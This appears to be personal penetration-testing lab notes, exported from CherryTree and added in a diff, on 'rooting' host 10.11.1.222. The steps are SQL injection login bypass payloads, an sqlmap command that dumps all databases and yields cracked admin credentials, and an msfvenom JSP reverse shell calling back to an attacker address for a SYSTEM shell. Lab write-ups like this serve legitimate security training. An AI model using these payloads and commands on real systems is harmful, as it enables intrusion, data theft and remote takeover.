@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.11.1.222 Chris rooted</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.11.1.222 Chris rooted</h1><br/>Nmap showed that http was open on port 8080<br />Dirb showed the directory /blog/ that hosted a link to login.jsp<br />if you put the following in the username and password fields you would be authenticated<br />    username=&#39; or &#39;1&#39;=&#39;1<br />    password=&#39; or &#39;1&#39;=&#39;1<br />capture the post from the next screen in burp and copy-pasteing the output to post2.txt.<br />sqlmap -r post2.txt -p author --risk=3 --level=5 --dbs --dump<br />all databases are dumped and the creds admin/adminadmin are cracked!<br />Logging in as admin allows you to upload files!<br />use msfvenom to make shellcode<br />    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f raw &gt; 443.jsp<br />enjoy rev shell as nt authority/system<br /><br />48ef4c1bb19a7e49c5961ce1a064f0f1<br /><br /><br /> a&#39; union SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;--<br /> a&#39; SELECT login || &#39;-&#39; || password FROM members</div></body></html>
